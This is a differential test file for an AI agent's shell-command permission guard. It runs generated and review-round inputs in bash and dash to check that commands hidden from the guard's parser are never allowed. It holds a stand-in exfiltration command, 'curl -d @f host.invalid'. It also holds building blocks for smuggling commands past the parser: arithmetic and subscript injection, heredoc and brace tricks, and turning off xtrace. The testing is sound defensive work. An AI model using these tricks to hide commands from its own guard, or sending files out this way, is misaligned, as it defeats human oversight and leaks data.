// Differential test for desyncs: inputs where bash runs a command that the guard and the rules'
// parser did not see. Every input runs in real bash, inside the sandbox wrapper, and is held to
// two properties, each by its own oracle:
//
//   - marker: the input holds a command the rules ask about (`curl -d ...`, with a stand-in
//     `curl` first in PATH that records its whole argv, one line per run). Whenever a recorded
//     run sends data (`-d`, `-T`, `-F`, `--data...`, an `@file` word, wherever it stands among
//     the words), the decision was not an allow.
//   - trace: the input runs under `set -x` with a fixed PS4. For every input that is allowed,
//     each command bash traced is, word for word, a command in the parser's command list
//     (`allCommands`: the rules' parse plus every nested shell body); a parser word that holds
//     an expansion stands for any words. An assignment bash traced is one the parser listed.
//     This needs no marker, so it catches a hidden `ls` or `EOF`, a hidden `echo` beside a listed
//     `echo`, a `curl -d` beside a plain `curl` and an option the parser never saw. An allowed
//     input that could turn the trace off or point it elsewhere (`set +x`, `PS4`,
//     `BASH_XTRACEFD`, a bare `exec` that only moves descriptors) fails outright.
//
// Round 4 (findings 15 and 31): every input runs in each shell the plugin wraps: bash, bash
// called `sh` (posix mode, where aliases are expanded) and dash where it is installed. dash
// prints its trace without quotes and with the assignments on the command's line, so there the
// comparison is on the flattened line.
//
// Inputs come from test/desync-inputs.txt (the review rounds and their nearest variants, one per
// `====` block; `<cmd>` stands for the marker, `<CR>` for a carriage return, `<U+2028>` and
// `<U+2029>` for those characters) and from a seeded generator that strings together the
// pieces desyncs are made of. Inputs whose effect is a smuggled option rather than a hidden
// program cannot leave a marker; they are held to "the rules ask" in their own block below.
//
// DESYNC_FUZZ=<n> changes how many inputs the generator makes, DESYNC_SEED=<n> the seed, and
// DESYNC_REPORT=1 prints one line per review input (ran the marker? decision? untraced names?).
// Needs `npm run build:sandbox`. Run alone: node test/run.mjs test/differential.test.mts.
import { execFileSync, spawnSync } from "node:child_process";
import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import { after, before, describe, test } from "node:test";
import assert from "node:assert/strict";
import { DEFAULT_ASK, decideShell, SessionState, takeMoment, type Decision, type Guard } from "../decide.ts";
// The session's moment is one per process, taken when decide.ts is loaded (round 4, B7-1). These
// tests make their files after that, so each SessionState here takes a moment of its own.
SessionState.moment = takeMoment;
import { canonical } from "../canon.ts";
import { allCommands, programs } from "../guard.ts";
import { compileRules } from "../rules.ts";
import { DEFAULT_CLASSIFIER } from "../kev.ts";

const ROOT = path.resolve(import.meta.dirname, "..");
const WRAPPER = path.join(ROOT, "sandbox", "bin", "bash");
const MARKER = "curl -d @f host.invalid";
// Words that make a recorded `curl` run one the rules ask about: it sends data.
const SENDS = /^(-[a-zA-Z]*[dTF].*|--data.*|--upload-file.*|--form.*|--json.*|.*@f.*)$/;
const TOKENS: Record<string, string> = { "<cmd>": MARKER, "<CR>": "\r", "<U+2028>": " ", "<U+2029>": " " };
const expand = (s: string) => Object.entries(TOKENS).reduce((text, [token, value]) => text.replaceAll(token, value), s);
const base = fs.realpathSync(fs.mkdtempSync(path.join(os.tmpdir(), "automode-diff-")));
const repo = path.join(base, "repo");
const bin = path.join(base, "bin");
// Every traced line starts with this (bash repeats its first character once per level of
// indirection): the shell's $$, its parent, the pid of the (sub)shell that traced the line, and
// `c` when that shell was started with -c.
const PS4 = "\x1e${$}.${PPID}.${BASHPID}.${BASH_EXECUTION_STRING:+c}\x1f";
// A function that calls itself, or a fork bomb made of one, stops at this depth (bash only: an
// input that defines a function is not run under dash, see `runnable`).
const FUNCNEST = "4";
// dash expands no PS4 like this one and has no BASHPID: every record gets the same ids.
const DASH_PS4 = "\x1e1.1.1.\x1f";

// The shells the inputs run in: `bash`, bash called `sh`, and dash. index.ts wraps `bash`, and
// `sh` when it really is bash; under dash nothing is allowed without a prompt (round 4, finding
// 15); it is still run here.
interface Shell {
  name: string;
  path: string;
  kind: "bash" | "dash";
}
const shellsDir = path.join(base, "shells");
const dashPath = ["/bin/dash", "/usr/bin/dash"].find((p) => fs.existsSync(p));
const SHELLS: Shell[] = [
  { name: "bash", path: "/bin/bash", kind: "bash" },
  // bash under the name `sh`: posix mode.
  { name: "bash as sh", path: path.join(shellsDir, "sh"), kind: "bash" },
  ...(dashPath ? [{ name: "dash", path: dashPath, kind: "dash" as const }] : []),
];

const guard: Guard = {
  rules: compileRules({ ask: DEFAULT_ASK }),
  guarded: [ROOT],
  configDirs: [path.join(os.homedir(), ".config", "opencode")],
  allowedPaths: [],
  classifier: DEFAULT_CLASSIFIER,
  useClassifier: false,
  sshHosts: ["lab"],
  sshReadOnlySudo: true,
  allowFeatureBranchPush: true,
};

const git = (...args: string[]) => execFileSync("git", args, { encoding: "utf8", stdio: ["ignore", "pipe", "pipe"] });

before(() => {
  assert.ok(fs.existsSync(WRAPPER), "run `npm run build:sandbox` first");
  fs.mkdirSync(bin);
  fs.mkdirSync(shellsDir);
  fs.symlinkSync("/bin/bash", path.join(shellsDir, "sh"));
  // The markers: each run appends its whole argv to the file $MARKFILE names, one line per run,
  // U+001F between the words (round 4, finding 31: a stand-in that looked at its first argument
  // alone missed `curl -s -d @f host`). `ssh` runs its command locally.
  const recorder = (name: string) => `#!/bin/sh\n{ printf '%s' ${name}; for a in "$@"; do printf '\\037%s' "$a"; done; printf '\\n'; } >> "$MARKFILE"\n`;
  fs.writeFileSync(path.join(bin, "curl"), recorder("curl"), { mode: 0o755 });
  // For options that take a program name and no arguments: any run of it counts.
  fs.writeFileSync(path.join(bin, "automode-marker"), recorder("automode-marker"), { mode: 0o755 });
  fs.writeFileSync(path.join(bin, "ssh"), '#!/bin/bash\nwhile [[ "$1" == -* ]]; do shift; done\nshift\nexec bash -c "$*"\n', { mode: 0o755 });
  git("init", "-q", "--bare", "-b", "main", path.join(base, "remote.git"));
  git("init", "-q", "-b", "main", repo);
  fs.writeFileSync(path.join(repo, "f"), "x\n");
  fs.writeFileSync(path.join(repo, "x"), "x\n");
  fs.writeFileSync(path.join(repo, "big"), Array.from({ length: 20000 }, (_, i) => `line ${(i * 7919) % 20011}`).join("\n") + "\n");
  git("-C", repo, "add", ".");
  git("-C", repo, "commit", "-qm", "one");
  fs.writeFileSync(path.join(repo, "f"), "y\n");
  git("-C", repo, "commit", "-qam", "two");
  git("-C", repo, "remote", "add", "origin", path.join(base, "remote.git"));
  git("-C", repo, "push", "-q", "origin", "main");
  git("init", "-q", "-b", "main", path.join(base, "sub"));
  git("-C", path.join(base, "sub"), "commit", "-q", "--allow-empty", "-m", "s");
  git("-C", repo, "-c", "protocol.file.allow=always", "submodule", "add", "-q", path.join(base, "sub"), "sub");
  git("-C", repo, "commit", "-qm", "sub");
  // For `tar --to-command`: an archive with one member (untracked).
  execFileSync("tar", ["-cf", "a.tar", "x"], { cwd: repo });
});
after(() => fs.rmSync(base, { recursive: true, force: true }));

interface Run {
  // A marker ran: `curl` sending data, or `automode-marker`.
  ran: boolean;
  // Every recorded run of a stand-in, as its words.
  argvs: string[][];
  // The input traced at least one command and the shell reported no parse error in it.
  parsedAndRan: boolean;
  trace: string;
}

// `name()` or `name ( )`, also with a backslash-newline between, or the `function` keyword: a
// function definition. FUNCNEST bounds a function that calls itself in bash; dash has no such
// limit, and neither has a `sh` or `dash` a bash input starts. Such an input runs as `:` there.
const DEFINES_FUNCTION = /[^\s$@!+*?<>|&;(){}`'"](?:[ \t]|\\\n)*\((?:[ \t\n]|\\\n)*\)|(?:^|[\s;&|(){}])function[ \t]/;
const STARTS_SH = /(?:^|[^\w.-])(?:sh|dash)(?:$|[^\w.-])/;
const runnable = (input: string, shell: Shell) => (DEFINES_FUNCTION.test(input) && (shell.kind === "dash" || STARTS_SH.test(input)) ? ":" : input);

// Runs every input in one shell, each in its own copy of the repository (or all in one
// directory), inside one sandbox that can only write below `base`, with xtrace on. bash writes
// the trace to fd 9 (also in a nested `bash -c`, through SHELLOPTS); dash writes it to stderr.
// Returns, per input, what the markers recorded, the trace, and whether it parsed and ran.
function runAll(inputs: string[], name: string, copies: boolean, shell: Shell = SHELLS[0]): Run[] {
  const dir = path.join(base, name);
  for (const sub of ["in", "out", "work", "err", "trace"]) fs.mkdirSync(path.join(dir, sub), { recursive: true });
  inputs.forEach((input, i) => fs.writeFileSync(path.join(dir, "in", String(i)), runnable(input, shell) + "\0"));
  const run =
    shell.kind === "bash"
      ? `MARKFILE="${dir}/out/$i" env SHELLOPTS=xtrace BASH_XTRACEFD=9 timeout 10 "${shell.path}" -c "$input" </dev/null >/dev/null 2>"${dir}/err/$i" 9>"${dir}/trace/$i"`
      : `MARKFILE="${dir}/out/$i" env PS4="$DASH_PS4" timeout 10 "${shell.path}" -x -c "$input" </dev/null >/dev/null 2>"${dir}/trace/$i"; : > "${dir}/err/$i"`;
  const driver = `
    i=0
    while [ -e "${dir}/in/$i" ]; do
      IFS= read -r -d '' input < "${dir}/in/$i"
      if [ -n "${copies ? "1" : ""}" ]; then cp -a "${repo}" "${dir}/work/$i"; cd "${dir}/work/$i"; else cd "${dir}/work"; fi
      ${run}
      i=$((i+1))
    done`;
  const env = { PATH: `${bin}:/usr/bin:/bin`, HOME: os.homedir(), GIT_CONFIG_GLOBAL: process.env.GIT_CONFIG_GLOBAL ?? "", LANG: "C", PS4, DASH_PS4, FUNCNEST, AUTOMODE_SHELL: "/bin/bash", AUTOMODE_RW: [base, "/dev/null"].join("\n") };
  const r = spawnSync(WRAPPER, ["-c", driver], { cwd: base, env, encoding: "utf8", timeout: 900_000, maxBuffer: 64 << 20 });
  assert.equal(r.status, 0, `the driver failed: ${r.stderr}`);
  const read = (sub: string, i: number) => fs.readFileSync(path.join(dir, sub, String(i)), "utf8");
  return inputs.map((_, i) => {
    // dash: only its own trace lines; whatever the commands wrote to stderr is dropped, and so
    // is a line two processes of a pipeline wrote at once (it holds the prefix twice).
    const trace = shell.kind === "bash" ? read("trace", i) : read("trace", i).split("\n").filter((line) => line.startsWith("\x1e") && line.split(DASH_PS4).length === 2).map((line) => line + "\n").join("");
    const out = path.join(dir, "out", String(i));
    const argvs = fs.existsSync(out) ? fs.readFileSync(out, "utf8").replace(/\n$/, "").split("\n").map((line) => line.split("\x1f")) : [];
    return {
      ran: argvs.some(([program, ...args]) => program === "automode-marker" || args.some((a) => SENDS.test(a))),
      argvs,
      // A parse error of the input itself; not an arithmetic error, an `eval` or a nested shell.
      parsedAndRan: trace.startsWith("\x1e") && !/^[^\n:]*: -c: line \d+: (syntax error|unexpected EOF)/m.test(read("err", i)),
      trace,
    };
  });
}

// ---- the trace oracle ----

interface Traced {
  shell: number;
  ppid: number;
  pid: number;
  dashC: boolean;
  text: string;
}
// One record per traced command. A traced word that holds a newline is printed raw (bash 5.2
// quotes it with '...'), so a line that does not start with PS4 continues the record before it.
function records(trace: string): Traced[] {
  const out: Traced[] = [];
  for (const line of trace.replace(/\n$/, "").split("\n")) {
    const m = /^\x1e+(\d+)\.(\d+)\.(\d+)\.(c?)\x1f([\s\S]*)$/.exec(line);
    if (m) out.push({ shell: +m[1], ppid: +m[2], pid: +m[3], dashC: m[4] === "c", text: m[5] });
    else if (out.length) out.at(-1)!.text += "\n" + line;
  }
  return out;
}
// The records of the input's own shell, its subshells, command substitutions and `eval`s, and of
// a `bash -c` one of those started (whose parent, or whose own pid after an exec, is one of
// them). A bash script that some program runs (npm, make, git) is not the input's: its parent
// is that program.
function own(all: Traced[]): Traced[] {
  if (!all.length) return [];
  const shells = new Set([all[0].shell]);
  const pids = new Set<number>([all[0].shell]);
  const out: Traced[] = [];
  for (const r of all) {
    if (!shells.has(r.shell)) {
      if (!(r.dashC && (pids.has(r.ppid) || pids.has(r.shell)))) continue;
      shells.add(r.shell);
    }
    pids.add(r.pid);
    pids.add(r.shell);
    out.push(r);
  }
  return out;
}
// The words of a traced command, with bash's xtrace quoting ('...', \x, $'...') removed.
function traceWords(text: string): string[] {
  const words: string[] = [];
  let word = "";
  let has = false;
  const end = () => {
    if (has) words.push(word);
    word = "";
    has = false;
  };
  for (let i = 0; i < text.length; ) {
    const c = text[i];
    if (c === " " || c === "\n" || c === "\t") {
      end();
      i++;
    } else if (c === "'") {
      const close = text.indexOf("'", i + 1);
      word += text.slice(i + 1, close < 0 ? text.length : close);
      i = close < 0 ? text.length : close + 1;
      has = true;
    } else if (c === "$" && text[i + 1] === "'") {
      let j = i + 2;
      for (; j < text.length && text[j] !== "'"; j++) {
        if (text[j] !== "\\") word += text[j];
        else {
          const e = text[++j];
          const simple: Record<string, string> = { n: "\n", t: "\t", r: "\r", e: "\x1b", E: "\x1b", a: "\x07", b: "\b", f: "\f", v: "\v" };
          if (e === "x") {
            const hex = /^[0-9a-fA-F]{1,2}/.exec(text.slice(j + 1))![0];
            word += String.fromCharCode(parseInt(hex, 16));
            j += hex.length;
          } else if (/[0-7]/.test(e)) {
            const oct = /^[0-7]{1,3}/.exec(text.slice(j))![0];
            word += String.fromCharCode(parseInt(oct, 8));
            j += oct.length - 1;
          } else word += simple[e] ?? e;
        }
      }
      i = j + 1;
      has = true;
    } else if (c === "\\") {
      word += text[i + 1] ?? "";
      i += 2;
      has = true;
    } else {
      word += c;
      i++;
      has = true;
    }
  }
  end();
  return words;
}
// Traced lines that name no program: the compound commands bash traces by their keyword (`for x
// in ...`, `case x in`, `select`, `((`, `[[`). Whatever these expand is traced on its own lines.
const ASSIGNMENT = /^([A-Za-z_][A-Za-z0-9_]*)(\[[^\]]*\])?\+?=/;
const KEYWORD_LINES = new Set(["for", "select", "case", "((", "[["]);

// What the parser listed: per simple command, its assignment words and the words from the first
// that is not a reserved word or an assignment (`if ls`, `do head`, `x=1 ls`, `time -p ls`,
// `{ ls`).
const RESERVED = new Set(["{", "}", "if", "then", "elif", "else", "fi", "do", "done", "while", "until", "!", "time", "esac", "coproc"]);
interface Listed {
  // Every word shaped like an assignment, wherever it stands: bash traces the ones before a
  // command, and those `export`, `declare` and `local` are handed, on lines of their own.
  assigns: string[];
  // The assignment words before the command (dash prints them on the command's line).
  prefix: string[];
  words: string[];
}
// `text` is the text that ran: for an allowed input, the one the decision printed (canon.ts).
// `repeats`: a loop, a function or a trap can run a listed command more than once.
function listed(input: string): { commands: Listed[]; repeats: boolean } {
  const commands: Listed[] = [];
  let repeats = DEFINES_FUNCTION.test(input);
  for (const { argv } of allCommands(input)) {
    if (argv.some((w) => ["for", "while", "until", "select", "function", "trap"].includes(w))) repeats = true;
    const prefix: string[] = [];
    let i = 0;
    while (i < argv.length) {
      const w = argv[i];
      if (RESERVED.has(w) || (w === "-p" && argv[i - 1] === "time")) i++;
      else if (ASSIGNMENT.test(w)) {
        prefix.push(w);
        i++;
      } else if (w === "function") i += 2;
      else break;
    }
    commands.push({ assigns: argv.filter((w) => ASSIGNMENT.test(w)), prefix, words: argv.slice(i) });
  }
  return { commands, repeats };
}
// A parser word bash may turn into other words: it holds an expansion, a glob, braces or a `~`.
const dynamic = (word: string) => /[$`*?[{~]/.test(word);
const home = (word: string) => (word === "~" || word.startsWith("~/") ? os.homedir() + word.slice(1) : word);
// Whether the traced words are the listed ones: a plain word is itself, a dynamic one any words.
// The program's own name is never "any word": a name the parser cannot read vouches for nothing
// (`x=ls; $x`). A leading `~/` is the home directory.
function sameWords(want: string[], got: string[]): boolean {
  if (!got.length || home(want[0]) !== got[0]) return false;
  // reach[j]: the listed words so far can be the first j traced words.
  let reach = new Array<boolean>(got.length + 1).fill(false);
  reach[1] = true;
  for (let i = 1; i < want.length; i++) {
    const next = new Array<boolean>(got.length + 1).fill(false);
    if (dynamic(want[i])) {
      let any = false;
      for (let j = 0; j <= got.length; j++) next[j] = any ||= reach[j];
    } else for (let j = 0; j < got.length; j++) next[j + 1] = reach[j] && want[i] === got[j];
    reach = next;
  }
  return reach[got.length];
}
// dash: the flattened line, up to its first line break (a word with a newline is printed raw),
// cut at its blanks: a plain listed word is the pieces it is cut into, a dynamic one any pieces.
function sameLine(want: Listed, line: string): boolean {
  const parts = [...want.prefix, ...want.words.map((w, n) => (n ? w : home(w)))];
  if (!parts.length) return false;
  const name = want.prefix.length;
  const pieces: (string | undefined)[] = [];
  for (const [n, p] of parts.entries()) {
    if (dynamic(p) && n !== name) pieces.push(undefined);
    else {
      pieces.push(...p.split("\n")[0].split(" "));
      // The trace line ends at a word's line break.
      if (p.includes("\n")) break;
    }
  }
  const got = line.split(" ");
  let reach = new Array<boolean>(got.length + 1).fill(false);
  reach[0] = true;
  for (const piece of pieces) {
    const next = new Array<boolean>(got.length + 1).fill(false);
    if (piece === undefined) {
      let any = false;
      for (let j = 0; j <= got.length; j++) next[j] = any ||= reach[j];
    } else for (let j = 0; j < got.length; j++) next[j + 1] = reach[j] && piece === got[j];
    reach = next;
  }
  return reach[got.length];
}
// The traced commands no listed command accounts for. Without a loop, a function or a trap each
// listed command runs at most once, so it accounts for one traced command (round 4, finding 31:
// a hidden `echo` beside a listed `echo`); `edges[n]` lists the commands that could be record n.
function unaccounted(edges: number[][], repeats: boolean): number[] {
  if (repeats) return edges.flatMap((e, n) => (e.length ? [] : [n]));
  const owner = new Map<number, number>();
  const place = (n: number, seen: Set<number>): boolean => {
    for (const c of edges[n]) {
      if (seen.has(c)) continue;
      seen.add(c);
      if (!owner.has(c) || place(owner.get(c)!, seen)) {
        owner.set(c, n);
        return true;
      }
    }
    return false;
  };
  return edges.flatMap((_, n) => (place(n, new Set()) ? [] : [n]));
}

// Commands and assignments the shell ran that the parser did not list, as the trace shows them.
// `blind`: the input did something that can turn the trace off or point it elsewhere.
//
// `judged`: the text the rules read for this input (canon.ts), where it is not `input` itself.
// Every program bash traced must then also be the program of a command in that text, so a
// command that is in the text that runs and missing from the one that is judged shows. (Its
// words are not compared there: the judged text holds fixed words in place of a git message
// and of arithmetic.)
function compare(input: string, run: Run, shell: Shell = SHELLS[0], judged?: string): { untraced: string[]; blind?: string } {
  const { commands: want, repeats } = listed(runnable(input, shell));
  const judgedNames = judged === undefined || judged === input || runnable(input, shell) !== input ? undefined : new Set(listed(judged).commands.map((c) => home(c.words[0] ?? "")));
  const untraced = new Set<string>();
  const shown: string[] = [];
  const edges: number[][] = [];
  let blind: string | undefined;
  for (const r of own(records(run.trace))) {
    const text = shell.kind === "dash" ? r.text.split("\n")[0] : r.text;
    if (/\b(PS4|BASH_XTRACEFD)\b/.test(text) || /^(set|shopt)\b.*(\+[a-zA-Z]*x|\+o xtrace|-u[a-zA-Z]* .*xtrace|-[a-zA-Z]*u[a-zA-Z]* xtrace)/.test(text) || text === "exec") blind ??= text;
    if (shell.kind === "dash") {
      // dash prints the words unquoted, so a line cannot be split back into them. A line that is
      // a listed command as written is that command; any other is held to its program's name (a
      // line that starts with an assignment is not judged: its value may hold blanks).
      const name = text.split(" ")[0];
      // A line with no word: a command made of redirections alone.
      if (text === "" || ASSIGNMENT.test(name) || KEYWORD_LINES.has(name) || want.some((w) => sameLine(w, text) || (w.words.length > 0 && home(w.words[0]) === name))) continue;
      untraced.add(text);
      continue;
    }
    const assigned = ASSIGNMENT.exec(text);
    if (assigned) {
      // An assignment: one the parser listed for that name, with that value when it is literal.
      const got = traceWords(text);
      const value = got.length === 1 ? got[0].slice(got[0].indexOf("=") + 1) : undefined;
      const ok = want.some((w) =>
        w.assigns.some((a) => {
          const m = ASSIGNMENT.exec(a)!;
          const literal = a.slice(m[0].length);
          return m[1] === assigned[1] && (value === undefined || dynamic(literal) || literal === value);
        }),
      );
      if (!ok) untraced.add(text);
      continue;
    }
    const got = traceWords(text);
    if (!got.length || KEYWORD_LINES.has(got[0])) continue;
    if (judgedNames && !judgedNames.has(got[0])) untraced.add(`${got.join(" ")} (not a command of the text the rules read)`);
    shown.push(got.join(" "));
    edges.push(want.flatMap((w, n) => (w.words.length > 0 && sameWords(w.words, got) ? [n] : [])));
  }
  for (const n of unaccounted(edges, repeats)) untraced.add(shown[n]);
  return { untraced: [...untraced], ...(blind ? { blind } : {}) };
}
const untraced = (input: string, run: Run, shell: Shell = SHELLS[0]): string[] => compare(input, run, shell).untraced;

const decide = (session: SessionState, input: string): Promise<Decision> => {
  session.files = new Map(); // an earlier input's writes must not send this one to the model
  return decideShell(guard, session, repo, input);
};

// A set of inputs, the decision taken for each, and the text that runs for it: the text the
// printer gives (round 4, finding 16: an allow is an allow of that text, and the plugin hands it
// to the shell), or the input itself where the printer asks (it then runs only as approved).
interface Judged {
  inputs: string[];
  decisions: Decision[];
  texts: string[];
}
async function judge(inputs: string[]): Promise<Judged> {
  const session = new SessionState(repo);
  const decisions: Decision[] = [];
  for (const input of inputs) decisions.push(await decide(session, input));
  return { inputs, decisions, texts: inputs.map((input, i) => decisions[i].printed ?? printedText(input) ?? input) };
}
// An allow carries its printed text; for any other decision the printer is asked directly.
const printedText = (input: string): string | undefined => {
  const printed = canonical(input);
  return "ask" in printed ? undefined : printed.text;
};
const judgedText = (input: string): string | undefined => {
  const printed = canonical(input);
  return "ask" in printed ? undefined : printed.judged;
};

function allowedThoughRan(set: Judged, runs: Run[]): string[] {
  const bad: string[] = [];
  for (const [i, input] of set.inputs.entries()) {
    if (!runs[i].ran || set.decisions[i].effect !== "allow") continue;
    bad.push(`${JSON.stringify(input)} (run as ${JSON.stringify(set.texts[i])}) ran ${runs[i].argvs.map((a) => JSON.stringify(a.join(" "))).join(", ")}`);
  }
  return bad;
}

function allowedThoughUntraced(set: Judged, runs: Run[], shell: Shell): string[] {
  const bad: string[] = [];
  for (const [i, input] of set.inputs.entries()) {
    if (set.decisions[i].effect !== "allow") continue;
    const found = compare(set.texts[i], runs[i], shell, judgedText(input));
    if (found.blind) bad.push(`${JSON.stringify(input)} can turn the trace off (${JSON.stringify(found.blind)})`);
    else if (found.untraced.length) bad.push(`${JSON.stringify(input)} (run as ${JSON.stringify(set.texts[i])}) ran ${found.untraced.map((m) => JSON.stringify(m)).join(", ")}`);
  }
  return bad;
}

// The round trip: bash does the same for the printed text as for the input as written. What it
// traced (the words of every command, in any order: a pipeline's sides race) and what the
// markers recorded must be the same, numbers and the run's own directory aside (`$$`, `$RANDOM`
// and `pwd` differ between any two runs). This holds the printer's reading of the input to
// bash's: where they differ, the printed text does something else than the command asked for.
// Held for every input that can run as its printed text without a prompt: an allow, and one the
// rules leave to the model. (An input that asks runs as written once approved.) The words are
// compared one by one (joined, `declare 'y=a b'` and `declare y=a b` would look alike). Left out
// of the comparison, because the printer rewrites them on purpose: the code word of a nested
// shell and the words of `eval` (the commands they run are compared), and the `cat` of a heredoc
// that was folded into the literal it prints. A number of four digits or more counts as any
// number (a pid); a shorter one is compared (`head -3` is not `head -9`).
function roundTrip(set: Judged, original: Run[], printed: Run[], names: [string, string]): string[] {
  // `loose`: the text names a process id or another number that differs from run to run (`$$` is
  // three digits long inside the sandbox's own pid namespace): every number then counts as any.
  const shape = (run: Run, name: string, loose: boolean) => {
    const plain = (text: string) => text.replaceAll(path.join(base, name), "<dir>").replace(loose ? /\d+/g : /\d{4,}/g, "N");
    // The code word after a shell's name and its `-c`, at the places where the printer takes
    // the name for a program (`programs`, the traversal `Printer.code` uses): it prints the
    // word as code also behind a program it does not know, which may be a wrapper. A shell's
    // name that is an argument of `echo` is left alone there and compared here. The code
    // word is brought to the printer's spelling on both sides before it is compared: printed
    // until the text no longer changes (a second print can still drop a quote or renumber a
    // heredoc), with the heredoc delimiters' numbers taken out. That holds the printed word to
    // "the code as the printer spells it" and catches a word the outer printer changed in any
    // other way. It does not show that the printed code runs as the written code does: that is
    // the trace's job, and behind a wrapper that forks (`timeout 5 bash -c`, `xargs bash -c`)
    // the nested shell's own commands are not in the trace.
    const printedCode = (text: string) => {
      let now = text;
      for (let n = 0; n < 4; n++) {
        const c = canonical(now);
        if ("ask" in c || c.text === now) break;
        now = c.text;
      }
      return now.replace(/AUTOMODE_EOF_\d+/g, "AUTOMODE_EOF");
    };
    const code = (words: string[]) => {
      if (path.basename(words[0] ?? "") === "eval") return [words[0], "<code>"];
      const out = [...words];
      for (const at of programs(words)) {
        if (!["bash", "sh", "dash"].includes(path.basename(words[at]))) continue;
        const flag = words.findIndex((x, n) => n > at && /^-[a-zA-Z]*c$/.test(x));
        if (flag >= 0 && flag + 1 < words.length) out[flag + 1] = printedCode(words[flag + 1]);
      }
      return out;
    };
    const commands = own(records(run.trace))
      .map((r) => traceWords(r.text))
      .map((words) => JSON.stringify(code(words).map(plain)));
    return { commands, argvs: run.argvs.map((a) => JSON.stringify(code(a).map(plain))).sort() };
  };
  const lone = JSON.stringify(["cat"]);
  const lones = (commands: string[]) => commands.filter((c) => c === lone).length;
  // What the two runs of one input did, as two strings to compare.
  const pair = (i: number, was: Run, now: Run, dirs: [string, string]): [string, string] => {
    // The printer folds `"$(cat <<'X' ...)"` into the text it holds, so the input runs lone
    // `cat`s the printed text does not: they are left out of the input's side, and only where
    // the printed text has fewer such heredocs than the input (it used to be every lone `cat`
    // on both sides, whenever the input held one).
    const heredocs = (text: string) => text.match(/\$\(\s*cat\s*<</g)?.length ?? 0;
    const loose = /\$[$!]|\$\{?(?:RANDOM|SRANDOM|BASHPID|PPID|SECONDS|EPOCH)/.test(set.texts[i]);
    const [a, b] = [shape(was, dirs[0], loose), shape(now, dirs[1], loose)];
    // One `$(cat <<` in the text can run more than once (`{,}"$(cat <<EOF ...)"` is two words),
    // so where the printed text has lost one, every lone `cat` the input ran beyond the printed
    // text's is left out.
    const folds = heredocs(set.inputs[i]) > heredocs(set.texts[i]) ? lones(a.commands) - lones(b.commands) : 0;
    for (let n = 0; n < folds; n++) a.commands.splice(a.commands.indexOf(lone), 1);
    return [JSON.stringify([a.commands.sort(), a.argvs]), JSON.stringify([b.commands.sort(), b.argvs])];
  };
  const differs: { i: number; was: Set<string>; now: Set<string>; first: [string, string] }[] = [];
  for (const [i, input] of set.inputs.entries()) {
    if (set.texts[i] === input || !(set.decisions[i].effect === "allow" || set.decisions[i].by === "no-model")) continue;
    // One of the two did not run as it is (see `runnable`).
    if (runnable(input, SHELLS[0]) !== input || runnable(set.texts[i], SHELLS[0]) !== set.texts[i]) continue;
    const [was, now] = pair(i, original[i], printed[i], names);
    if (was !== now) differs.push({ i, was: new Set([was]), now: new Set([now]), first: [was, now] });
  }
  // A difference may be bash's own timing: the `||` branch of a process substitution whose
  // reader has gone runs or not from one run to the next, for the same text. Only an input
  // that holds a process substitution is run again, both texts, and it fails when nothing the
  // one did was ever what the other did. Any other input that differs fails at once. (What
  // this cannot see: a printer mistake confined to such a timing-dependent branch, once each
  // text has skipped the branch in some run.)
  const met = (d: (typeof differs)[number]) => [...d.was].some((w) => d.now.has(w));
  const timed = (d: (typeof differs)[number]) => /[<>]\(/.test(set.texts[d.i]);
  for (let again = 1; again <= 3 && differs.some((d) => timed(d) && !met(d)); again++) {
    const open = differs.filter((d) => timed(d) && !met(d));
    const dirs: [string, string] = [`${names[0]}-again-${again}`, `${names[1]}-again-${again}`];
    const was = runAll(open.map((d) => set.inputs[d.i]), dirs[0], true);
    const now = runAll(open.map((d) => set.texts[d.i]), dirs[1], true);
    open.forEach((d, n) => {
      const [a, b] = pair(d.i, was[n], now[n], dirs);
      d.was.add(a);
      d.now.add(b);
    });
  }
  return differs.filter((d) => !met(d)).map((d) => `${JSON.stringify(set.inputs[d.i])}\n  printed ${JSON.stringify(set.texts[d.i])}\n  as written: ${d.first[0]}\n  printed:    ${d.first[1]}`);
}

// ---- the generator ----

// A small deterministic generator (mulberry32).
function random(seed: number) {
  return () => {
    seed = (seed + 0x6d2b79f5) | 0;
    let t = Math.imul(seed ^ (seed >>> 15), 1 | seed);
    t = (t + Math.imul(t ^ (t >>> 7), 61 | t)) ^ t;
    return ((t ^ (t >>> 14)) >>> 0) / 4294967296;
  };
}
// What desyncs are made of. A bare `(` is here (so `$\⏎(` and `(\⏎(` can form), so an input can
// define a function; FUNCNEST stops whatever recurses, a fork bomb included, at depth 4 in bash
// (see `runnable` for dash). Nothing here deletes or loops without end (`for x in` has a finite
// list).
const PIECES = [
  "echo ", "echo ", ": ", "a", "x", "1", " ", " ", "\t", "\n", "\n", ";", ";", "\\", "\\ ", "\\\n", "\\\n", "#", "#", "'", "'", '"', '"', "$'", "$\"", "`", "$(", "(", "(", ")", "<(", "${x:-", "${x#", "${#x", "${x", "}", "}",
  "$((", "((", "))", "$[", "[", "]", "<<EOF", "<<'EOF'", "<<-EOF", "<<", "\nEOF\n", "EOF", "EO\\\nF", "\nEO\\\nF\n", "<", ">", ">&2", ">&", ">&2#", ">&-#", "2>&1", "&&", "|", "{", ",", "=", "!", "*", "-", "@P", "$x", "$", "$\\\n", "$\\\n(", "(\\\n(", "<\\\n<EOF\n",
  "\r", "\rEOF", "\rEOF\n", "shopt -s extglob\n", "bash -O extglob -c '", "@(", "!(", "+(", "*(", "?(", " #)", "$e{", "${e}{", "$e{-", ",}", "${e}{curl,-d,@f,host.invalid}",
  "x='", "x='a[b[0]+$(<cmd>)]'", "x='$(<cmd>)'; y=\"b[$x]\"; (( y ))", "(( x ))", "$(( x ))", "let x", "${a[x]}",
  "bash -c ", "eval ", "case x in ", "x) ", ";;", "esac", "if ", "then ", "fi", "for x in ", "do ", "done", "[[ ", " ]]", "[[ x == @(", "x=", " <cmd> ", "<cmd>",
  // A backslash-newline straight after `&&`, `||` or `|`, before whatever piece comes next.
  "&&\\\n", "||\\\n", "|\\\n", "|\\\n\t", "&&\\\n  ", "&\\\n", "|&\\\n",
  // Round 4. Finding 1: inside `$(...)`, a heredoc body line that starts with the delimiter and
  // goes on. Finding 2: seven or more brace groups in one word, a range beside a comma group.
  // Finding 3: `+n` after `-n`. Finding 13: `--` or an option after `-c`. Finding 14: an alias.
  // Finding 31: a function definition.
  "$(cat <<EOF\n", "\"$(cat <<EOF\n", "$(cat <<'EOF'\n", "(\n", "\nEOF)", "\nEOF )", "EOF)", "EOF)\"", "\nEOF\n)", "\nEOF\n)\"",
